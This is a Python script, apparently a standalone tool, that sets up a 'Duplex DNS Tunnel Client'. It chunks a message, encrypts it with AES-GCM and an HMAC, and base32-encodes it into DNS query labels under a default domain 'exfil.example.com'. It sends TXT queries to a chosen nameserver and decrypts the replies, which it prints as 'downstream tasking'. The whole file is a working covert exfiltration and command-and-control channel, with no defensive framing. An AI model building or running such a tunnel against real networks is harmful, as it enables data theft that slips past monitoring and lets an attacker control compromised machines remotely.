#!/usr/bin/env python3
import argparse
import base64
import socket
import struct
import sys
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes
from dnslib import DNSRecord, QTYPE

class AdvancedCryptoClient:
    def __init__(self, secret: bytes):
        self.master_secret = secret

    def _derive_key(self, session_id: bytes) -> bytes:
        h = HMAC.new(self.master_secret, digestmod=SHA256)
        h.update(session_id)
        return h.digest()[:32]

    def encrypt_payload(self, plaintext: bytes, session_id: bytes) -> bytes:
        key = self._derive_key(session_id)
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, gcm_tag = cipher.encrypt_and_digest(plaintext)
        h = HMAC.new(key, digestmod=SHA256)
        h.update(nonce + ciphertext + gcm_tag)
        return nonce + ciphertext + gcm_tag + h.digest()[:4]

    def decrypt_payload(self, blob: bytes, session_id: bytes) -> bytes:
        if len(blob) < 12 + 16 + 4:
            raise ValueError("Downstream blob size invalid")
        key = self._derive_key(session_id)
        nonce = blob[:12]
        tag = blob[-20:-4]
        hmac_tag = blob[-4:]
        ciphertext = blob[12:-20]

        h = HMAC.new(key, digestmod=SHA256)
        h.update(nonce + ciphertext + tag)
        if not h.digest()[:4] == hmac_tag:
            raise ValueError("Downstream HMAC mismatch")

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

def segment_base32_to_labels(b32_string: str, label_size: int = 60) -> str:
    return ".".join(b32_string[i : i + label_size] for i in range(0, len(b32_string), label_size))

def main():
    parser = argparse.ArgumentParser(description="Duplex DNS Tunnel Client")
    parser.add_argument("-d", "--domain", default="exfil.example.com")
    parser.add_argument("-n", "--nameserver", required=True)
    parser.add_argument("-p", "--port", type=int, default=53)
    parser.add_argument("-s", "--secret-file", required=True)
    parser.add_argument("-m", "--message", required=True)
    args = parser.parse_args()

    secret = Path(args.secret_file).read_bytes()
    crypto = AdvancedCryptoClient(secret)

    chunk_size = 58
    raw_data = args.message.encode("utf-8")
    data_chunks = [raw_data[i : i + chunk_size] for i in range(0, len(raw_data), chunk_size)]

    session_id = get_random_bytes(16)
    total_chunks = len(data_chunks)

    for seq_num, chunk in enumerate(data_chunks):
        is_last = 1 if (seq_num == total_chunks - 1) else 0
        header = struct.pack("!HBB", seq_num, is_last, len(chunk))
        
        # Packaging and encryption
        encrypted_blob = crypto.encrypt_payload(header + chunk, session_id)
        b32_str = base64.b32encode(session_id + encrypted_blob).decode("utf-8").rstrip("=")
        fqdn = f"{segment_base32_to_labels(b32_str).lower()}.{args.domain.strip('.')}"

        # Force a TXT record query to request downstream payloads
        record = DNSRecord.question(fqdn, "TXT")
        
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(3.0)
            try:
                sock.sendto(record.pack(), (args.nameserver, args.port))
                response_packet, _ = sock.recvfrom(1024)
                parsed_response = DNSRecord.parse(response_packet)
                
                # Check if the server returned any text answers
                for r in parsed_response.rr:
                    if r.rtype == QTYPE.TXT:
                        # Extract string data from TXT payload representation
                        encoded_downstream = "".join([s.decode('utf-8') for s in r.rdata.data])
                        
                        # Rebuild padding and process crypto packet
                        pad_needed = (-len(encoded_downstream)) % 8
                        raw_downstream_blob = base64.b32decode(encoded_downstream + ("=" * pad_needed))
                        
                        # Decrypt downstream content using current session parameters
                        clear_text_instruction = crypto.decrypt_payload(raw_downstream_blob, session_id)
                        print(f"\n[!] RECEIVED DOWNSTREAM TASKING: {clear_text_instruction.decode('utf-8')}")
            except Exception as e:
                print(f"[-] Error processing frame {seq_num}: {e}")

if __name__ == "__main__":
    main()